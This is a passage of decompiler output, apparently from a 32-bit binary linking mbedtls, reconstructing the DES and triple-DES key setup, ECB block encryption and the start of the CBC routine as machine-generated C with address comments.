    int32_t v5 = v4 + 16; // 0x806b16e
    g5 = v5;
    mbedtls_des_setkey(g7 + 128, (char *)(v4 + 8));
    mbedtls_des_setkey(g3 + 256, (char *)v5);
    int32_t v6 = 0; // edx
    int32_t v7 = 0; // eax
    int32_t v8 = 0; // 0x806b1a7
    int32_t v9 = 0; // 0x806b1a0
    // branch -> 0x806b1a0
    while (true) {
        int32_t v10 = *(int32_t *)(v9 + 376 + g3); // 0x806b1a0
        *(int32_t *)(g7 + 4 * v8) = v10;
        int32_t v11 = *(int32_t *)(g3 + 380 + v6); // 0x806b1aa
        *(int32_t *)(g7 + 4 + 4 * v7) = v11;
        int32_t v12 = *(int32_t *)(g7 + 248 + v6); // 0x806b1b5
        *(int32_t *)(g3 + 128 + 4 * v7) = v12;
        int32_t v13 = *(int32_t *)(g7 + 252 + v6); // 0x806b1c3
        *(int32_t *)(g3 + 132 + 4 * v7) = v13;
        int32_t v14 = *(int32_t *)(g3 + 120 + v6); // 0x806b1d1
        *(int32_t *)(g7 + 256 + 4 * v7) = v14;
        int32_t v15 = v6; // 0x806b1dc
        int32_t v16 = *(int32_t *)(g3 + 124 + v15); // 0x806b1dc
        v6 = v15 - 8;
        *(int32_t *)(g7 + 260 + 4 * v7) = v16;
        int32_t v17 = v7 + 2; // 0x806b1ea
        v7 = v17;
        if (v17 == 32) {
            // 0x806b1f2
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 32;
        }
        // 0x806b1a0
        v8 = v17;
        v9 = v6;
        // branch -> 0x806b1a0
    }
}

// Address range: 0x806b200 - 0x806b23f
int32_t mbedtls_des3_set3key_enc(int32_t a1, int32_t a2) {
    // 0x806b200
    int32_t v1;
    int32_t v2 = v1; // bp-392
    int32_t v3 = g3; // bp-8
    int32_t v4 = &v2; // 0x806b204_3
    g1 = a1;
    g4 = a2;
    g3 = v4;
    g6 = v4;
    des3_set3key(v1, 0);
    *(char *)g3 = 0;
    int32_t v5 = g3 + 1; // 0x806b223
    g3 = v5;
    // branch -> 0x806b220
    while (v5 != (int32_t)&v3) {
        // 0x806b220
        *(char *)v5 = 0;
        v5 = g3 + 1;
        g3 = v5;
        // continue -> 0x806b220
    }
    // 0x806b22a
    g3 = v3;
    int32_t v6;
    return &v6;
}

// Address range: 0x806b240 - 0x806b27f
int32_t mbedtls_des3_set3key_dec(int32_t a1, int32_t result) {
    // 0x806b240
    int32_t v1;
    int32_t v2 = v1; // bp-392
    int32_t v3 = g3; // bp-8
    int32_t v4 = &v2; // 0x806b244_3
    g4 = result;
    g6 = a1;
    g3 = v4;
    g1 = v4;
    des3_set3key(v1, 0);
    *(char *)g3 = 0;
    int32_t v5 = g3 + 1; // 0x806b263
    g3 = v5;
    // branch -> 0x806b260
    while (v5 != (int32_t)&v3) {
        // 0x806b260
        *(char *)v5 = 0;
        v5 = g3 + 1;
        g3 = v5;
        // continue -> 0x806b260
    }
    // 0x806b26a
    int32_t v6;
    g1 = &v6;
    g3 = v3;
    return result;
}

// Address range: 0x806b280 - 0x806b4f0
int32_t mbedtls_des_crypt_ecb(int32_t a1, char * a2, char * a3) {
    int32_t v1 = (int32_t)a2;
    unsigned char v2 = *a2; // 0x806b289
    unsigned char v3 = *(char *)(v1 + 3); // 0x806b28c
    unsigned char v4 = *(char *)(v1 + 5); // 0x806b290
    unsigned char v5 = *(char *)(v1 + 1); // 0x806b299
    unsigned char v6 = *(char *)(v1 + 2); // 0x806b2a5
    uint32_t v7 = 256 * (int32_t)v6 | 0x10000 * (int32_t)v5 | 0x1000000 * (int32_t)v2 | (int32_t)v3; // 0x806b2ac
    unsigned char v8 = *(char *)(v1 + 4); // 0x806b2ae
    unsigned char v9 = *(char *)(v1 + 7); // 0x806b2b7
    unsigned char v10 = *(char *)(v1 + 6); // 0x806b2bb
    int32_t v11 = (int32_t)v9 | 0x1000000 * (int32_t)v8 | 0x10000 * (int32_t)v4 | 256 * (int32_t)v10; // 0x806b2c4
    int32_t v12 = (v11 ^ v7 / 16) & 0xf0f0f0f; // 0x806b2cd
    int32_t v13 = v12 ^ v11; // 0x806b2d8
    uint32_t v14 = 16 * v12 ^ v7; // 0x806b2da
    uint32_t v15 = v14 / 0x10000 ^ v13; // 0x806b2e1
    uint32_t v16 = v15 % 0x10000 ^ v13; // 0x806b2e8
    int32_t v17 = 0x10000 * v15 ^ v14; // 0x806b2ef
    int32_t v18 = (v16 / 4 ^ v17) & 0x33333333; // 0x806b2f6
    int32_t v19 = v18 ^ v17; // 0x806b303
    uint32_t v20 = 4 * v18 ^ v16; // 0x806b305
    int32_t v21 = (v20 / 256 ^ v19) & 0xff00ff; // 0x806b30e
    int32_t v22 = v21 ^ v19; // 0x806b314
    int32_t v23 = 256 * v21 ^ v20; // 0x806b319
    int32_t v24 = 2 * v23; // 0x806b31b
    int32_t v25 = (v24 ^ v22) & -0x55555556; // 0x806b322
    int32_t v26 = v25 ^ v22; // 0x806b328
    int32_t v27 = v25 ^ (v24 | (int32_t)(v23 < 0)); // 0x806b32a
    int32_t v28 = 2 * v26 | (int32_t)(v26 < 0); // 0x806b351
    int32_t v29 = 0; // 0x806b3c2
    uint32_t v30 = *(int32_t *)(a1 + v29) ^ v27; // 0x806b340
    int32_t v31 = *(int32_t *)(v29 + 4 + a1); // 0x806b348
    uint32_t v32 = v31 ^ (0x10000000 * v27 | v27 / 16); // 0x806b348
    int32_t v33 = *(int32_t *)(4 * (v30 % 64) + 0x807d2a0); // 0x806b351
    int32_t v34 = *(int32_t *)(4 * (v30 / 256 % 64) + 0x807d3a0); // 0x806b360
    int32_t v35 = *(int32_t *)(4 * (v30 / 0x10000 % 64) + 0x807d4a0); // 0x806b375
    int32_t v36 = *(int32_t *)(4 * (v30 / 0x1000000 % 64) + 0x807d5a0); // 0x806b37c
    int32_t v37 = *(int32_t *)(4 * (v32 % 64) + 0x807d6a0); // 0x806b38b
    int32_t v38 = *(int32_t *)(4 * (v32 / 256 % 64) + 0x807d7a0); // 0x806b39a
    int32_t v39 = *(int32_t *)(4 * (v32 / 0x10000 % 64) + 0x807d8a0); // 0x806b3af
    int32_t v40 = *(int32_t *)(4 * (v32 / 0x1000000 % 64) + 0x807d9a0); // 0x806b3b6
    int32_t v41 = v40 ^ v39 ^ v38 ^ v37 ^ v36 ^ v35 ^ v34 ^ v33 ^ v28; // 0x806b3b6
    uint32_t v42 = *(int32_t *)(v29 + 8 + a1) ^ v41; // 0x806b3c2
    int32_t v43 = 0; // 0x806b3cb
    int32_t v44 = *(int32_t *)(a1 + 12 + v43); // 0x806b3cb
    uint32_t v45 = v44 ^ (0x10000000 * v41 | v41 / 16); // 0x806b3cb
    int32_t v46 = *(int32_t *)(4 * (v42 % 64) + 0x807d2a0); // 0x806b3d4
    int32_t v47 = *(int32_t *)(4 * (v42 / 256 % 64) + 0x807d3a0); // 0x806b3e3
    int32_t v48 = v43 + 16; // 0x806b3ef
    int32_t v49 = *(int32_t *)(4 * (v42 / 0x10000 % 64) + 0x807d4a0); // 0x806b3fb
    int32_t v50 = *(int32_t *)(4 * (v42 / 0x1000000 % 64) + 0x807d5a0); // 0x806b402
    int32_t v51 = *(int32_t *)(4 * (v45 % 64) + 0x807d6a0); // 0x806b40e
    int32_t v52 = *(int32_t *)(4 * (v45 / 256 % 64) + 0x807d7a0); // 0x806b41d
    int32_t v53 = *(int32_t *)(4 * (v45 / 0x10000 % 64) + 0x807d8a0); // 0x806b432
    int32_t v54 = *(int32_t *)(4 * (v45 / 0x1000000 % 64) + 0x807d9a0); // 0x806b439
    int32_t v55 = v54 ^ v53 ^ v52 ^ v51 ^ v50 ^ v49 ^ v47 ^ v46 ^ v27; // 0x806b439
    // branch -> 0x806b338
    while (v48 != 128) {
        // 0x806b338
        v29 = v48;
        v27 = v55;
        v30 = *(int32_t *)(a1 + v29) ^ v27;
        v31 = *(int32_t *)(v29 + 4 + a1);
        v32 = v31 ^ (0x10000000 * v27 | v27 / 16);
        v33 = *(int32_t *)(4 * (v30 % 64) + 0x807d2a0);
        v34 = *(int32_t *)(4 * (v30 / 256 % 64) + 0x807d3a0);
        v35 = *(int32_t *)(4 * (v30 / 0x10000 % 64) + 0x807d4a0);
        v36 = *(int32_t *)(4 * (v30 / 0x1000000 % 64) + 0x807d5a0);
        v37 = *(int32_t *)(4 * (v32 % 64) + 0x807d6a0);
        v38 = *(int32_t *)(4 * (v32 / 256 % 64) + 0x807d7a0);
        v39 = *(int32_t *)(4 * (v32 / 0x10000 % 64) + 0x807d8a0);
        v40 = *(int32_t *)(4 * (v32 / 0x1000000 % 64) + 0x807d9a0);
        v41 = v40 ^ v39 ^ v38 ^ v37 ^ v36 ^ v35 ^ v34 ^ v33 ^ v41;
        v42 = *(int32_t *)(v29 + 8 + a1) ^ v41;
        v43 = v48;
        v44 = *(int32_t *)(a1 + 12 + v43);
        v45 = v44 ^ (0x10000000 * v41 | v41 / 16);
        v46 = *(int32_t *)(4 * (v42 % 64) + 0x807d2a0);
        v47 = *(int32_t *)(4 * (v42 / 256 % 64) + 0x807d3a0);
        v48 = v43 + 16;
        v49 = *(int32_t *)(4 * (v42 / 0x10000 % 64) + 0x807d4a0);
        v50 = *(int32_t *)(4 * (v42 / 0x1000000 % 64) + 0x807d5a0);
        v51 = *(int32_t *)(4 * (v45 % 64) + 0x807d6a0);
        v52 = *(int32_t *)(4 * (v45 / 256 % 64) + 0x807d7a0);
        v53 = *(int32_t *)(4 * (v45 / 0x10000 % 64) + 0x807d8a0);
        v54 = *(int32_t *)(4 * (v45 / 0x1000000 % 64) + 0x807d9a0);
        v55 = v54 ^ v53 ^ v52 ^ v51 ^ v50 ^ v49 ^ v47 ^ v46 ^ v27;
        // continue -> 0x806b338
    }
    int32_t v56 = v55 / 2 | 0x80000000 * v55; // 0x806b44e
    int32_t v57 = (v41 ^ v56) & -0x55555556; // 0x806b454
    int32_t v58 = v57 ^ v56; // 0x806b45c
    uint32_t v59 = (v57 ^ v41) / 2 | 0x80000000 * v41; // 0x806b45e
    int32_t v60 = (v59 / 256 ^ v58) & 0xff00ff; // 0x806b467
    int32_t v61 = v60 ^ v58; // 0x806b46d
    uint32_t v62 = 256 * v60 ^ v59; // 0x806b472
    int32_t v63 = (v62 / 4 ^ v61) & 0x33333333; // 0x806b47b
    uint32_t v64 = v63 ^ v61; // 0x806b480
    int32_t v65 = 4 * v63 ^ v62; // 0x806b489
    uint32_t v66 = v65 ^ v64 / 0x10000; // 0x806b490
    int32_t v67 = v66 % 0x10000 ^ v65; // 0x806b498
    uint32_t v68 = 0x10000 * v66 ^ v64; // 0x806b49d
    int32_t v69 = (int32_t)a3; // ebx
    int32_t v70 = (v68 / 16 ^ v67) & 0xf0f0f0f; // 0x806b4a9
    v27 = v70 ^ v67;
    int32_t v71 = 16 * v70 ^ v68; // 0x806b4b3
    *a3 = (char)(v71 / 0x1000000);
    *(char *)(v69 + 1) = (char)(v71 / 0x10000);
    *(char *)(v69 + 3) = (char)v71;
    *(char *)(v69 + 4) = (char)(v27 / 0x1000000);
    int32_t v72 = v71 / 256; // 0x806b4d3
    g4 = v72;
    *(char *)(v69 + 5) = (char)(v27 / 0x10000);
    *(char *)(v69 + 6) = (char)(v27 / 256);
    *(char *)(v69 + 2) = (char)v72;
    *(char *)(v69 + 7) = (char)v27;
    int32_t v73;
    g2 = v73;
    return 0;
}

// Address range: 0x806b4f1 - 0x806b4ff
int32_t function_806b4f1(void) {
    // 0x806b4f1
    mbedtls_des3_crypt_ecb(0, NULL, NULL);
    g1 = 0;
    return 0;
}

// Address range: 0x806b500 - 0x806b9af
int32_t mbedtls_des3_crypt_ecb(int32_t a1, char * a2, char * a3) {
    int32_t v1 = (int32_t)a2;
    unsigned char v2 = *a2; // 0x806b50c
    unsigned char v3 = *(char *)(v1 + 3); // 0x806b50f
    unsigned char v4 = *(char *)(v1 + 5); // 0x806b513
    unsigned char v5 = *(char *)(v1 + 1); // 0x806b51c
    unsigned char v6 = *(char *)(v1 + 2); // 0x806b528
    uint32_t v7 = 256 * (int32_t)v6 | 0x10000 * (int32_t)v5 | 0x1000000 * (int32_t)v2 | (int32_t)v3; // 0x806b52f
    unsigned char v8 = *(char *)(v1 + 4); // 0x806b531
    unsigned char v9 = *(char *)(v1 + 7); // 0x806b53a
    unsigned char v10 = *(char *)(v1 + 6); // 0x806b53e
    int32_t v11 = 0x1000000 * (int32_t)v8 | 0x10000 * (int32_t)v4 | (int32_t)v9 | 256 * (int32_t)v10; // 0x806b547
    int32_t v12 = (v11 ^ v7 / 16) & 0xf0f0f0f; // 0x806b550
    int32_t v13 = v12 ^ v11; // 0x806b55b
    uint32_t v14 = 16 * v12 ^ v7; // 0x806b55d
    uint32_t v15 = v14 / 0x10000 ^ v13; // 0x806b564
    uint32_t v16 = v15 % 0x10000 ^ v13; // 0x806b56b
    int32_t v17 = 0x10000 * v15 ^ v14; // 0x806b572
    int32_t v18 = (v16 / 4 ^ v17) & 0x33333333; // 0x806b579
    int32_t v19 = v18 ^ v17; // 0x806b586
    uint32_t v20 = 4 * v18 ^ v16; // 0x806b588
    int32_t v21 = (v20 / 256 ^ v19) & 0xff00ff; // 0x806b591
    int32_t v22 = v21 ^ v19; // 0x806b597
    int32_t v23 = 256 * v21 ^ v20; // 0x806b59c
    int32_t v24 = 2 * v23; // 0x806b59e
    int32_t v25 = (v24 ^ v22) & -0x55555556; // 0x806b5a5
    int32_t v26 = v25 ^ v22; // 0x806b5ab
    int32_t v27 = v25 ^ (v24 | (int32_t)(v23 < 0)); // 0x806b5ad
    int32_t v28 = 2 * v26 | (int32_t)(v26 < 0); // 0x806b5d1
    int32_t v29 = 0; // 0x806b642
    uint32_t v30 = *(int32_t *)(a1 + v29) ^ v27; // 0x806b5c0
    int32_t v31 = *(int32_t *)(v29 + 4 + a1); // 0x806b5c8
    uint32_t v32 = v31 ^ (0x10000000 * v27 | v27 / 16); // 0x806b5c8
    int32_t v33 = *(int32_t *)(4 * (v30 % 64) + 0x807d2a0); // 0x806b5d1
    int32_t v34 = *(int32_t *)(4 * (v30 / 256 % 64) + 0x807d3a0); // 0x806b5e0
    int32_t v35 = *(int32_t *)(4 * (v30 / 0x10000 % 64) + 0x807d4a0); // 0x806b5f5
    int32_t v36 = *(int32_t *)(4 * (v30 / 0x1000000 % 64) + 0x807d5a0); // 0x806b5fc
    int32_t v37 = *(int32_t *)(4 * (v32 % 64) + 0x807d6a0); // 0x806b60b
    int32_t v38 = *(int32_t *)(4 * (v32 / 256 % 64) + 0x807d7a0); // 0x806b61a
    int32_t v39 = *(int32_t *)(4 * (v32 / 0x10000 % 64) + 0x807d8a0); // 0x806b62f
    int32_t v40 = *(int32_t *)(4 * (v32 / 0x1000000 % 64) + 0x807d9a0); // 0x806b636
    int32_t v41 = v40 ^ v39 ^ v38 ^ v37 ^ v36 ^ v35 ^ v34 ^ v33 ^ v28; // 0x806b636
    uint32_t v42 = *(int32_t *)(v29 + 8 + a1) ^ v41; // 0x806b642
    int32_t v43 = 0; // 0x806b64b
    int32_t v44 = *(int32_t *)(a1 + 12 + v43); // 0x806b64b
    uint32_t v45 = v44 ^ (0x10000000 * v41 | v41 / 16); // 0x806b64b
    int32_t v46 = *(int32_t *)(4 * (v42 % 64) + 0x807d2a0); // 0x806b654
    int32_t v47 = *(int32_t *)(4 * (v42 / 256 % 64) + 0x807d3a0); // 0x806b663
    int32_t v48 = v43 + 16; // 0x806b66f
    int32_t v49 = *(int32_t *)(4 * (v42 / 0x10000 % 64) + 0x807d4a0); // 0x806b67b
    int32_t v50 = *(int32_t *)(4 * (v42 / 0x1000000 % 64) + 0x807d5a0); // 0x806b682
    int32_t v51 = *(int32_t *)(4 * (v45 % 64) + 0x807d6a0); // 0x806b68e
    int32_t v52 = *(int32_t *)(4 * (v45 / 256 % 64) + 0x807d7a0); // 0x806b69d
    int32_t v53 = *(int32_t *)(4 * (v45 / 0x10000 % 64) + 0x807d8a0); // 0x806b6b2
    int32_t v54 = *(int32_t *)(4 * (v45 / 0x1000000 % 64) + 0x807d9a0); // 0x806b6b9
    int32_t v55 = v54 ^ v53 ^ v52 ^ v51 ^ v50 ^ v49 ^ v47 ^ v46 ^ v27; // 0x806b6b9
    // branch -> 0x806b5b8
    while (v48 != 128) {
        // 0x806b5b8
        v29 = v48;
        v27 = v55;
        v30 = *(int32_t *)(a1 + v29) ^ v27;
        v31 = *(int32_t *)(v29 + 4 + a1);
        v32 = v31 ^ (0x10000000 * v27 | v27 / 16);
        v33 = *(int32_t *)(4 * (v30 % 64) + 0x807d2a0);
        v34 = *(int32_t *)(4 * (v30 / 256 % 64) + 0x807d3a0);
        v35 = *(int32_t *)(4 * (v30 / 0x10000 % 64) + 0x807d4a0);
        v36 = *(int32_t *)(4 * (v30 / 0x1000000 % 64) + 0x807d5a0);
        v37 = *(int32_t *)(4 * (v32 % 64) + 0x807d6a0);
        v38 = *(int32_t *)(4 * (v32 / 256 % 64) + 0x807d7a0);
        v39 = *(int32_t *)(4 * (v32 / 0x10000 % 64) + 0x807d8a0);
        v40 = *(int32_t *)(4 * (v32 / 0x1000000 % 64) + 0x807d9a0);
        v41 = v40 ^ v39 ^ v38 ^ v37 ^ v36 ^ v35 ^ v34 ^ v33 ^ v41;
        v42 = *(int32_t *)(v29 + 8 + a1) ^ v41;
        v43 = v48;
        v44 = *(int32_t *)(a1 + 12 + v43);
        v45 = v44 ^ (0x10000000 * v41 | v41 / 16);
        v46 = *(int32_t *)(4 * (v42 % 64) + 0x807d2a0);
        v47 = *(int32_t *)(4 * (v42 / 256 % 64) + 0x807d3a0);
        v48 = v43 + 16;
        v49 = *(int32_t *)(4 * (v42 / 0x10000 % 64) + 0x807d4a0);
        v50 = *(int32_t *)(4 * (v42 / 0x1000000 % 64) + 0x807d5a0);
        v51 = *(int32_t *)(4 * (v45 % 64) + 0x807d6a0);
        v52 = *(int32_t *)(4 * (v45 / 256 % 64) + 0x807d7a0);
        v53 = *(int32_t *)(4 * (v45 / 0x10000 % 64) + 0x807d8a0);
        v54 = *(int32_t *)(4 * (v45 / 0x1000000 % 64) + 0x807d9a0);
        v55 = v54 ^ v53 ^ v52 ^ v51 ^ v50 ^ v49 ^ v47 ^ v46 ^ v27;
        // continue -> 0x806b5b8
    }
    int32_t v56 = a1 + 128; // 0x806b6d2
    int32_t v57 = v41; // 0x806b76e
    int32_t v58 = v56; // 0x806b75b
    uint32_t v59 = *(int32_t *)(v58 + 4) ^ (0x10000000 * v57 | v57 / 16); // 0x806b6ef
    uint32_t v60 = *(int32_t *)v58 ^ v57; // 0x806b6f2
    int32_t v61 = *(int32_t *)(4 * (v60 % 64) + 0x807d2a0); // 0x806b6f9
    int32_t v62 = *(int32_t *)(4 * (v60 / 256 % 64) + 0x807d3a0); // 0x806b708
    int32_t v63 = *(int32_t *)(4 * (v60 / 0x10000 % 64) + 0x807d4a0); // 0x806b71d
    int32_t v64 = *(int32_t *)(4 * (v60 / 0x1000000 % 64) + 0x807d5a0); // 0x806b724
    int32_t v65 = *(int32_t *)(4 * (v59 % 64) + 0x807d6a0); // 0x806b730
    int32_t v66 = *(int32_t *)(4 * (v59 / 256 % 64) + 0x807d7a0); // 0x806b73f
    int32_t v67 = *(int32_t *)(4 * (v59 / 0x10000 % 64) + 0x807d8a0); // 0x806b751
    int32_t v68 = *(int32_t *)(4 * (v59 / 0x1000000 % 64) + 0x807d9a0); // 0x806b75e
    int32_t v69 = v68 ^ v67 ^ v66 ^ v65 ^ v64 ^ v63 ^ v62 ^ v61 ^ v55; // 0x806b75e
    uint32_t v70 = v69 ^ *(int32_t *)(v58 + 8); // 0x806b765
    int32_t v71 = *(int32_t *)(4 * (v70 % 64) + 0x807d2a0); // 0x806b76e
    int32_t v72 = v56; // 0x806b780
    uint32_t v73 = *(int32_t *)(v72 + 12) ^ (0x10000000 * v69 | v69 / 16); // 0x806b780
    int32_t v74 = v72 + 16; // 0x806b783
    int32_t v75 = *(int32_t *)(4 * (v70 / 256 % 64) + 0x807d3a0); // 0x806b786
    int32_t v76 = *(int32_t *)(4 * (v70 / 0x10000 % 64) + 0x807d4a0); // 0x806b79b
    int32_t v77 = *(int32_t *)(4 * (v70 / 0x1000000 % 64) + 0x807d5a0); // 0x806b7a2
    int32_t v78 = *(int32_t *)(4 * (v73 % 64) + 0x807d6a0); // 0x806b7ae
    int32_t v79 = *(int32_t *)(4 * (v73 / 256 % 64) + 0x807d7a0); // 0x806b7bd
    int32_t v80 = *(int32_t *)(4 * (v73 / 0x10000 % 64) + 0x807d8a0); // 0x806b7d2
    int32_t v81 = *(int32_t *)(4 * (v73 / 0x1000000 % 64) + 0x807d9a0); // 0x806b7d9
    int32_t v82 = v81 ^ v80 ^ v79 ^ v78 ^ v77 ^ v76 ^ v75 ^ v71 ^ v57; // 0x806b7d9
    // branch -> 0x806b6e8
    while (a1 + 256 != v74) {
        // 0x806b6e8
        v57 = v82;
        v58 = v74;
        v59 = *(int32_t *)(v58 + 4) ^ (0x10000000 * v57 | v57 / 16);
        v60 = *(int32_t *)v58 ^ v57;
        v61 = *(int32_t *)(4 * (v60 % 64) + 0x807d2a0);
        v62 = *(int32_t *)(4 * (v60 / 256 % 64) + 0x807d3a0);
        v63 = *(int32_t *)(4 * (v60 / 0x10000 % 64) + 0x807d4a0);
        v64 = *(int32_t *)(4 * (v60 / 0x1000000 % 64) + 0x807d5a0);
        v65 = *(int32_t *)(4 * (v59 % 64) + 0x807d6a0);
        v66 = *(int32_t *)(4 * (v59 / 256 % 64) + 0x807d7a0);
        v67 = *(int32_t *)(4 * (v59 / 0x10000 % 64) + 0x807d8a0);
        v68 = *(int32_t *)(4 * (v59 / 0x1000000 % 64) + 0x807d9a0);
        v69 = v68 ^ v67 ^ v66 ^ v65 ^ v64 ^ v63 ^ v62 ^ v61 ^ v69;
        v70 = v69 ^ *(int32_t *)(v58 + 8);
        v71 = *(int32_t *)(4 * (v70 % 64) + 0x807d2a0);
        v72 = v74;
        v73 = *(int32_t *)(v72 + 12) ^ (0x10000000 * v69 | v69 / 16);
        v74 = v72 + 16;
        v75 = *(int32_t *)(4 * (v70 / 256 % 64) + 0x807d3a0);
        v76 = *(int32_t *)(4 * (v70 / 0x10000 % 64) + 0x807d4a0);
        v77 = *(int32_t *)(4 * (v70 / 0x1000000 % 64) + 0x807d5a0);
        v78 = *(int32_t *)(4 * (v73 % 64) + 0x807d6a0);
        v79 = *(int32_t *)(4 * (v73 / 256 % 64) + 0x807d7a0);
        v80 = *(int32_t *)(4 * (v73 / 0x10000 % 64) + 0x807d8a0);
        v81 = *(int32_t *)(4 * (v73 / 0x1000000 % 64) + 0x807d9a0);
        v82 = v81 ^ v80 ^ v79 ^ v78 ^ v77 ^ v76 ^ v75 ^ v71 ^ v57;
        // continue -> 0x806b6e8
    }
    int32_t v83 = v56 + 128; // 0x806b7f5
    int32_t v84 = v69; // 0x806b886
    uint32_t v85 = *(int32_t *)(v83 + 4) ^ (0x10000000 * v84 | v84 / 16); // 0x806b807
    uint32_t v86 = *(int32_t *)v83 ^ v84; // 0x806b80a
    int32_t v87 = *(int32_t *)(4 * (v86 % 64) + 0x807d2a0); // 0x806b811
    int32_t v88 = *(int32_t *)(4 * (v86 / 256 % 64) + 0x807d3a0); // 0x806b820
    int32_t v89 = *(int32_t *)(4 * (v86 / 0x10000 % 64) + 0x807d4a0); // 0x806b835
    int32_t v90 = *(int32_t *)(4 * (v86 / 0x1000000 % 64) + 0x807d5a0); // 0x806b83c
    int32_t v91 = *(int32_t *)(4 * (v85 % 64) + 0x807d6a0); // 0x806b848
    int32_t v92 = *(int32_t *)(4 * (v85 / 256 % 64) + 0x807d7a0); // 0x806b857
    int32_t v93 = *(int32_t *)(4 * (v85 / 0x10000 % 64) + 0x807d8a0); // 0x806b869
    int32_t v94 = *(int32_t *)(4 * (v85 / 0x1000000 % 64) + 0x807d9a0); // 0x806b876
    int32_t v95 = v94 ^ v93 ^ v92 ^ v91 ^ v90 ^ v89 ^ v88 ^ v87 ^ v82; // 0x806b876
    uint32_t v96 = v95 ^ *(int32_t *)(v83 + 8); // 0x806b87d
    int32_t v97 = *(int32_t *)(4 * (v96 % 64) + 0x807d2a0); // 0x806b886
    int32_t v98 = v83; // 0x806b898
    uint32_t v99 = *(int32_t *)(v98 + 12) ^ (0x10000000 * v95 | v95 / 16); // 0x806b898
    int32_t v100 = v98 + 16; // 0x806b89b
    int32_t v101 = *(int32_t *)(4 * (v96 / 256 % 64) + 0x807d3a0); // 0x806b89e
    int32_t v102 = *(int32_t *)(4 * (v96 / 0x10000 % 64) + 0x807d4a0); // 0x806b8b3
    int32_t v103 = *(int32_t *)(4 * (v96 / 0x1000000 % 64) + 0x807d5a0); // 0x806b8ba
    int32_t v104 = *(int32_t *)(4 * (v99 % 64) + 0x807d6a0); // 0x806b8c6
    int32_t v105 = *(int32_t *)(4 * (v99 / 256 % 64) + 0x807d7a0); // 0x806b8d5
    int32_t v106 = *(int32_t *)(4 * (v99 / 0x10000 % 64) + 0x807d8a0); // 0x806b8ea
    int32_t v107 = *(int32_t *)(4 * (v99 / 0x1000000 % 64) + 0x807d9a0); // 0x806b8f1
    int32_t v108 = v107 ^ v106 ^ v105 ^ v104 ^ v103 ^ v102 ^ v101 ^ v97 ^ v84; // 0x806b8f1
    // branch -> 0x806b800
    while (a1 + 384 != v100) {
        // 0x806b800
        v84 = v108;
        v83 = v100;
        v85 = *(int32_t *)(v83 + 4) ^ (0x10000000 * v84 | v84 / 16);
        v86 = *(int32_t *)v83 ^ v84;
        v87 = *(int32_t *)(4 * (v86 % 64) + 0x807d2a0);
        v88 = *(int32_t *)(4 * (v86 / 256 % 64) + 0x807d3a0);
        v89 = *(int32_t *)(4 * (v86 / 0x10000 % 64) + 0x807d4a0);
        v90 = *(int32_t *)(4 * (v86 / 0x1000000 % 64) + 0x807d5a0);
        v91 = *(int32_t *)(4 * (v85 % 64) + 0x807d6a0);
        v92 = *(int32_t *)(4 * (v85 / 256 % 64) + 0x807d7a0);
        v93 = *(int32_t *)(4 * (v85 / 0x10000 % 64) + 0x807d8a0);
        v94 = *(int32_t *)(4 * (v85 / 0x1000000 % 64) + 0x807d9a0);
        v95 = v94 ^ v93 ^ v92 ^ v91 ^ v90 ^ v89 ^ v88 ^ v87 ^ v95;
        v96 = v95 ^ *(int32_t *)(v83 + 8);
        v97 = *(int32_t *)(4 * (v96 % 64) + 0x807d2a0);
        v98 = v100;
        v99 = *(int32_t *)(v98 + 12) ^ (0x10000000 * v95 | v95 / 16);
        v100 = v98 + 16;
        v101 = *(int32_t *)(4 * (v96 / 256 % 64) + 0x807d3a0);
        v102 = *(int32_t *)(4 * (v96 / 0x10000 % 64) + 0x807d4a0);
        v103 = *(int32_t *)(4 * (v96 / 0x1000000 % 64) + 0x807d5a0);
        v104 = *(int32_t *)(4 * (v99 % 64) + 0x807d6a0);
        v105 = *(int32_t *)(4 * (v99 / 256 % 64) + 0x807d7a0);
        v106 = *(int32_t *)(4 * (v99 / 0x10000 % 64) + 0x807d8a0);
        v107 = *(int32_t *)(4 * (v99 / 0x1000000 % 64) + 0x807d9a0);
        v108 = v107 ^ v106 ^ v105 ^ v104 ^ v103 ^ v102 ^ v101 ^ v97 ^ v84;
        // continue -> 0x806b800
    }
    int32_t v109 = v108 / 2 | 0x80000000 * v108; // 0x806b903
    int32_t v110 = (v109 ^ v95) & -0x55555556; // 0x806b909
    int32_t v111 = v110 ^ v109; // 0x806b911
    uint32_t v112 = (v110 ^ v95) / 2 | 0x80000000 * v95; // 0x806b913
    int32_t v113 = (v112 / 256 ^ v111) & 0xff00ff; // 0x806b91c
    int32_t v114 = v113 ^ v111; // 0x806b922
    uint32_t v115 = 256 * v113 ^ v112; // 0x806b927
    int32_t v116 = (v115 / 4 ^ v114) & 0x33333333; // 0x806b930
    uint32_t v117 = v116 ^ v114; // 0x806b935
    int32_t v118 = 4 * v116 ^ v115; // 0x806b93e
    uint32_t v119 = v118 ^ v117 / 0x10000; // 0x806b945
    int32_t v120 = v119 % 0x10000 ^ v118; // 0x806b94d
    uint32_t v121 = 0x10000 * v119 ^ v117; // 0x806b952
    int32_t v122 = (int32_t)a3; // ebx
    int32_t v123 = (v121 / 16 ^ v120) & 0xf0f0f0f; // 0x806b95e
    g6 = v123 ^ v120;
    int32_t v124 = 16 * v123 ^ v121; // 0x806b968
    *a3 = (char)(v124 / 0x1000000);
    *(char *)(v122 + 1) = (char)(v124 / 0x10000);
    *(char *)(v122 + 3) = (char)v124;
    *(char *)(v122 + 4) = (char)(g6 / 0x1000000);
    int32_t v125 = v124 / 256; // 0x806b988
    g4 = v125;
    *(char *)(v122 + 5) = (char)(g6 / 0x10000);
    *(char *)(v122 + 6) = (char)(g6 / 256);
    *(char *)(v122 + 2) = (char)v125;
    *(char *)(v122 + 7) = (char)g6;
    int32_t v126;
    g2 = v126;
    return 0;
}

// Address range: 0x806b9b0 - 0x806ba9f
int32_t mbedtls_des3_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6) {
    int32_t v1 = g5; // 0x806b9b8
    int32_t v2 = g7; // 0x806b9b9
    int32_t v3 = g3; // 0x806b9ba
    g7 = (int32_t)a4;
    int32_t v4 = a3;
    if (a3 == 7) {
        // 0x806b9c7
        int32_t v5; // eax
        if (a2 == 1) {
            // 0x806ba50
            g5 = 0;
            int32_t v6 = 0; // 0x806ba5a
            // branch -> 0x806ba50
          lab_0x806ba50:
            while (true) {
                // 0x806ba50
                v5 = 0;
                int32_t v7 = v6 + a5; // 0x806ba58
                int32_t v8 = v6 + a6; // 0x806ba5a
                g3 = v8;
                int32_t v9 = 0; // 0x806ba67
                // branch -> 0x806ba60
                while (true) {
